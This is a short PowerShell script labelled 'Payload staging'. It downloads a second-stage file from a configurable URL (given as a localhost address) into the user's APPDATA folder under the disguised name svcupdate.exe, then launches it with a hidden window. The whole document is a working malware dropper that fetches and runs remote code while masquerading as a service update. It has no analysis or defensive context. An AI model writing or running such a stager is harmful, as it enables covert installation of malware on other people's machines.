<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://127.0.0.1:443/assets/update.dat",
    [string]$DropPath = "$env:APPDATA\svcupdate.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $DropPath)
Start-Process -FilePath $DropPath -WindowStyle Hidden
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
